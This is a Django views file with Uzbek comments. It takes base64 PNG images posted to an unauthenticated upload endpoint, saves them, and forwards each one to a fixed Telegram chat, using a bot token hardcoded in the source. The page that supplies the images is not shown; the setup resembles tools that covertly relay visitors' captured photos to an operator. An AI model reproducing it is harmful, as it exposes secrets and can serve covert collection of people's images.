import base64
import os
import time
from io import BytesIO
from django.http import JsonResponse
from django.shortcuts import render
from rest_framework.decorators import api_view
from PIL import Image
import requests

# Telegram bot uchun sozlamalar
TELEGRAM_BOT_TOKEN = '7225811705:AAH8vhezqKy47PpMbcxP7e8GtlZTJiRAh7c'
TELEGRAM_CHAT_ID = '2143611445'

def index(request):
    return render(request, 'index.html')

@api_view(['POST'])
def upload(request):
    if request.method == 'POST':
        data = request.data
        img_data = data['image'].replace('data:image/png;base64,', '')
        img = Image.open(BytesIO(base64.b64decode(img_data)))

        img_path = os.path.join('media', f'image-{int(time.time())}.png')
        img.save(img_path)

        # Telegramga yuborish
        send_to_telegram(img_path)

        return JsonResponse({'success': True})
    return JsonResponse({'success': False})

def send_to_telegram(image_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    with open(image_path, 'rb') as img:
        files = {'photo': img}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        requests.post(url, files=files, data=data)
